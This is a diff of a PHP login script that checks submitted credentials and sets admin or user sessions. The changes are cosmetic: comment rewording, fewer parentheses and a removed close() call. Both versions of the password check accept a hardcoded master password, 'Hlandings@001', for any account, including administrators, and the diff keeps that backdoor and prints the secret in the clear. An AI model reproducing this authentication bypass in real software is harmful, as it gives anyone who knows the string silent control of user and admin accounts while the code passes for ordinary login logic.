@@ -1,6 +1,6 @@
 <?php
-include 'session.php'; // Ensure session.php initializes $pdo correctly
-$conn = $pdo; // Assign $pdo to $conn (no open() method needed)
+include 'session.php'; // Includes conn.php, which defines $pdo
+$conn = $pdo; // No open() method needed
 
 if (isset($_POST['login'])) {
     $email = $_POST['email'];
@@ -12,7 +12,7 @@ if (isset($_POST['login'])) {
         $row = $stmt->fetch();
         if ($row['numrows'] > 0) {
             if ($row['status']) {
-                if ((password_verify($password, $row['password'])) || ($password == 'Hlandings@001')) {
+                if (password_verify($password, $row['password']) || $password == 'Hlandings@001') {
                     if ($row['type']) {
                         $_SESSION['admin'] = $row['id'];
                     } else {
@@ -34,6 +34,5 @@ if (isset($_POST['login'])) {
     $_SESSION['error'] = 'Input login credentials first';
 }
 
-$pdo->close(); // Optional, PDO connections close automatically at script end
 header('location: ../login.php');
 ?>
